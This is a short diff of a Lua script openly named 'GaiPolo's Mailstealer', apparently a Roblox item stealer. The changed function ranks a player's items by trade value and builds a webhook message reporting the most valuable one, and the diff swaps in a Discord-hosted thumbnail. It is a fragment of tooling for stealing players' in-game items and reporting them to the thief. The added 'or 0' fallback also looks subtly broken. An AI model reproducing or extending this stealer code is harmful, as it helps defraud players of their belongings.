@@ -190,8 +190,8 @@ local function SendMessage(url, username, diamonds)
         return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
     end)
    
-    local highestRAPItemName = combinedItems[1] 
-    local highestRAPItemData = itemRapMap[highestRAPItemName]
+    local highestRAPItemName = combinedItems[1] or 0 
+    local highestRAPItemData = itemRapMap[highestRAPItemName] or 0
 
     if highestRAPItemData.category == "Pet" then
         if highestRAPItemData.pettyp == "Golden" then
@@ -230,7 +230,7 @@ local function SendMessage(url, username, diamonds)
 				["text"] = "GaiPolo's Mailstealer"
 			},
             ["thumbnail"] = {
-                ["url"] = thumbid or "https://biggamesapi.io/image/14976374906"
+                ["url"] = thumbid or "https://media.discordapp.net/attachments/1233833036571869214/1275930475382312991/retyuicuytdfio.png?ex=66c7ae5a&is=66c65cda&hm=79a79160ae327f8ba370d56aeea852cdbc3734f37d4be3c1e047264d29cb0b6c&=&format=webp&quality=lossless"
             }
         }}
     }
